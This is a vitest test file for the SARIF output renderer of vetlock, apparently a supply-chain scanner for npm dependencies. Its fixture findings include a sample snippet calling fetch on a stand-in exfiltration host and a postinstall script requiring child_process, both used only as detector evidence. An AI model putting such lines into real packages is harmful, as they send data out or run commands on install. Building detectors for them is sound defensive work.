import { describe, it, expect } from 'vitest';
import type { Finding, RunResult } from '@vetlock/core';
import { renderSARIF, VETLOCK_VERSION } from '../dist/index.js';

function makeFinding(overrides: Partial<Finding> = {}): Finding {
  return {
    detector: 'net.new-endpoint',
    category: 'NET',
    package: 'chalk',
    from: '5.3.0',
    to: '5.3.1',
    direction: 'changed',
    severity: 'BLOCK',
    confidence: 'high',
    message: 'New network endpoint reached',
    evidence: [{ file: 'index.js', line: 7, snippet: 'fetch("https://exfil.example.invalid")' }],
    provenance: [['my-app', 'chalk']],
    ...overrides,
  };
}

function makeResult(findings: Finding[]): RunResult {
  return {
    verdict: findings.some((finding) => finding.severity === 'BLOCK') ? 'BLOCK' : 'WARN',
    findings,
    rollupByDirect: {
      chalk: {
        maxSeverity: findings.some((finding) => finding.severity === 'BLOCK') ? 'BLOCK' : 'WARN',
        count: findings.length,
      },
    },
    changes: [],
    errors: [],
    durationMs: 1,
  };
}

describe('renderSARIF', () => {
  it('emits SARIF 2.1.0 with the required top-level and run fields', () => {
    const sarif = JSON.parse(renderSARIF(makeResult([
      makeFinding(),
      makeFinding({
        detector: 'exec.new-module',
        category: 'EXEC',
        severity: 'WARN',
        message: 'Package started using child_process',
        evidence: [{ file: 'postinstall.js', line: 3, snippet: 'require("child_process")' }],
      }),
    ])));

    expect(sarif).toHaveProperty('$schema');
    expect(sarif.version).toBe('2.1.0');
    expect(Array.isArray(sarif.runs)).toBe(true);
    expect(sarif.runs[0].tool.driver.name).toBe('vetlock');
    expect(sarif.runs[0].tool.driver.version).toBe(VETLOCK_VERSION);
    expect(sarif.runs[0].tool.driver.version).not.toBe('0.2.0');
    expect(Array.isArray(sarif.runs[0].tool.driver.rules)).toBe(true);
    expect(Array.isArray(sarif.runs[0].results)).toBe(true);

    for (const result of sarif.runs[0].results) {
      expect(result.ruleId).toBeTruthy();
      expect(result.level).toBeTruthy();
      expect(result.message.text).toBeTruthy();
      expect(Array.isArray(result.locations)).toBe(true);
      expect(result.locations[0].physicalLocation.artifactLocation.uri).toBeTruthy();
      expect(result.locations[0].physicalLocation.region.startLine).toBeGreaterThan(0);
    }
  });

  it('handles findings with no evidence without emitting invalid locations', () => {
    const sarif = JSON.parse(renderSARIF(makeResult([
      makeFinding({ detector: 'integrity.hash-mismatch', category: 'INTEG' }),
      makeFinding({
        detector: 'analysis.failed',
        category: 'META',
        evidence: [],
        message: 'Analyzer failed closed',
      }),
    ])));

    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs[0].tool.driver.rules.some((rule: { id: string }) => rule.id === 'analysis.failed')).toBe(true);
    expect(sarif.runs[0].results).toHaveLength(1);
    expect(sarif.runs[0].results[0].ruleId).toBe('integrity.hash-mismatch');
    expect(sarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri).toBe('chalk/index.js');
  });
});
